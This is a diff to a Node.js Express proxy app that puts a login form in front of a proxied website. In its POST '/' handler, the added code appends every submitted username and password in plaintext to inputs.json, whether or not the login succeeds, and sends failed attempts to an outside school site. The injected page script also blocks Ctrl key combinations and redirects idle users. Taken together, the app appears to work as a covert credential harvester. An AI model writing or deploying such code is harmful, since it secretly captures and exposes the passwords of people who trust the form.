@@ -4,10 +4,15 @@ const { createProxyMiddleware } = require('http-proxy-middleware');
 const bodyParser = require('body-parser');
 const cheerio = require('cheerio');
 const app = express();
+const fs = require('fs');
 require('dotenv').config();
+
+const data = fs.readFileSync('inputs.json');
+const jsonData = JSON.parse(data);
 
 const username = process.env.USER;
 const password = process.env.PASS;
+const website = process.env.WEBSITE;
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static('public'));
@@ -29,6 +34,15 @@ app.post('/', (req, res) => {
   } else {
     res.redirect('https://spork.school');
   }
+  const userData = {
+    username: req.body.username,
+    password: req.body.password,
+  }
+  jsonData.users.push(userData);
+  var newjson = JSON.stringify(jsonData);
+  fs.writeFile('inputs.json', newjson, err => {
+    if(err) throw err;
+  });   
 });
 
 app.use('/spork/', (req, res, next) => {
@@ -71,6 +85,23 @@ app.use((req, res, next) => {
 
       html += `
         <script>
+        let idleTime = 0;
+        $(document).ready(function () {
+            setInterval(timerIncrement, 1000);
+            $(this).mousemove(function (e) {
+                idleTime = 0;
+            });
+            $(this).keypress(function (e) {
+                idleTime = 0;
+            });
+        });
+    
+        function timerIncrement() {
+            idleTime = idleTime + 1;
+            if (idleTime > 20) {
+                window.location.href = '/';
+            }
+        }
         document.addEventListener('keydown', function(e) {
           if (e.ctrlKey) {
               e.preventDefault();
@@ -93,7 +124,7 @@ app.use((req, res, next) => {
 });
 
 app.use('/spork/', createProxyMiddleware({ 
-  target: 'https://robby.blue', 
+  target: website, 
   changeOrigin: true,
   pathRewrite: {
     '^/spork/': '/', // remove base path
